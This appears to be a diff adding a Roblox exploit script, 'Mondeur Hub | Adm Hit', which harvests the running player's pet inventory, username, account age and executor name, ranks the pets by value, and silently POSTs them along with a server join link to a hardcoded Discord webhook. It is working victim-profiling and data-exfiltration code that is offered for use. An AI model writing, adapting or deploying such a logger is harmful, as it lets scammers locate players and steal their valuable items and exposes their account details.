@@ -1,0 +1,205 @@
+--// MONDEUR HUB | ADM HIT 🦊 (V3 FINAL)
+
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
+
+local lp = Players.LocalPlayer
+
+-- 🔥 PROXY WEBHOOK
+local webhook = "https://webhook.lewisakura.moe/api/webhooks/1408047737102012506/4VZHtB_G9RmikEuLs0-A6yP_0AXaYmb4_4Y3TyaG_0Wxem1-OvNBtPC9n71B4-SSzkUa"
+
+-- executor
+local executor =
+    (identifyexecutor and identifyexecutor()) or
+    (getexecutorname and getexecutorname()) or
+    "Unknown"
+
+-- request
+local req =
+    (syn and syn.request) or
+    (http and http.request) or
+    (http_request) or
+    (request)
+
+if not req then return end
+
+-- =========================
+-- 🐶 GET PETS
+-- =========================
+local petsRaw = {}
+
+local success, clientData = pcall(function()
+    return require(ReplicatedStorage.ClientModules.Core.ClientData)
+end)
+
+if success and clientData then
+    local data = clientData.get_data()[tostring(lp)]
+
+    if data and data.inventory and data.inventory.pets then
+        for _, pet in pairs(data.inventory.pets) do
+            table.insert(petsRaw, pet)
+        end
+    end
+end
+
+-- =========================
+-- 🧠 CLEAN NAME
+-- =========================
+local function cleanName(name)
+    name = name:gsub("_", " ")
+    return name:gsub("(%l)(%w*)", function(a,b)
+        return string.upper(a)..b
+    end)
+end
+
+-- =========================
+-- 💰 VALUE SYSTEM (BETTER)
+-- =========================
+local rarityValue = {
+    legendary = 5,
+    ultra_rare = 4,
+    rare = 3,
+    uncommon = 2,
+    common = 1
+}
+
+-- =========================
+-- 📦 STACK + PROCESS
+-- =========================
+local petMap = {}
+
+for _, pet in pairs(petsRaw) do
+    local name = cleanName(pet.id or "Unknown")
+    local rarity = (pet.rarity or "common"):lower()
+
+    local key = name
+
+    if not petMap[key] then
+        petMap[key] = {
+            name = name,
+            rarity = rarity,
+            count = 0,
+            neon = false,
+            mega = false,
+            fly = false,
+            ride = false
+        }
+    end
+
+    local p = petMap[key]
+    p.count += 1
+
+    if pet.properties then
+        if pet.properties.neon then p.neon = true end
+        if pet.properties.mega_neon then p.mega = true end
+        if pet.properties.flyable then p.fly = true end
+        if pet.properties.rideable then p.ride = true end
+    end
+end
+
+-- convert to list
+local pets = {}
+
+for _, p in pairs(petMap) do
+    local value = rarityValue[p.rarity] or 0
+
+    -- BOOST VALUE
+    if p.neon then value += 3 end
+    if p.mega then value += 5 end
+    if p.fly then value += 1 end
+    if p.ride then value += 1 end
+
+    p.value = value
+    table.insert(pets, p)
+end
+
+-- SORT
+table.sort(pets, function(a, b)
+    return a.value > b.value
+end)
+
+-- =========================
+-- 📋 FORMAT LIST
+-- =========================
+local function formatPets(pets)
+    local lines = {}
+
+    for i, pet in ipairs(pets) do
+        if i > 12 then break end
+
+        local tags = ""
+
+        if pet.mega then tags ..= "🌈 "
+        elseif pet.neon then tags ..= "🟣 "
+        end
+
+        if pet.fly then tags ..= "🪽 " end
+        if pet.ride then tags ..= "🏇 " end
+
+        local text = string.format("%s%s x%d", tags, pet.name, pet.count)
+        table.insert(lines, text)
+    end
+
+    if #lines == 0 then return "No pets found" end
+    return table.concat(lines, "\n")
+end
+
+local petList = formatPets(pets)
+
+-- =========================
+-- 🔗 JOIN LINK
+-- =========================
+local joinLink = string.format(
+    "https://floating.gg/?placeID=%s&gameInstanceId=%s",
+    game.PlaceId,
+    game.JobId
+)
+
+-- =========================
+-- 📊 WEBHOOK
+-- =========================
+local data = {
+    ["content"] = "",
+
+    ["embeds"] = {{
+        ["title"] = "🦊 Mondeur Hub | Adm Hit",
+
+        ["description"] =
+            "```" ..
+            "👤 Display Name : " .. lp.DisplayName .. "\n" ..
+            "🆔 Username     : " .. lp.Name .. "\n" ..
+            "📅 Account Age  : " .. lp.AccountAge .. " days\n" ..
+            "📱 Executor     : " .. executor .. "\n" ..
+            "👥 Players      : " .. #Players:GetPlayers() .. "/" .. Players.MaxPlayers .. "\n" ..
+            "💰 Total Value  : Pending" ..
+            "```",
+
+        ["fields"] = {
+            {
+                ["name"] = "🐶 Pets (Best → Worst)",
+                ["value"] = "```" .. petList .. "```",
+                ["inline"] = false
+            },
+            {
+                ["name"] = "🌐 Join Server",
+                ["value"] = "[Click to Join](" .. joinLink .. ")",
+                ["inline"] = false
+            }
+        },
+
+        ["color"] = 0x2F3136,
+        ["footer"] = { ["text"] = "Mondeur Hub • Advanced Logger" },
+        ["timestamp"] = DateTime.now():ToIsoDate()
+    }}
+}
+
+-- SEND
+pcall(function()
+    req({
+        Url = webhook,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = HttpService:JSONEncode(data)
+    })
+end)
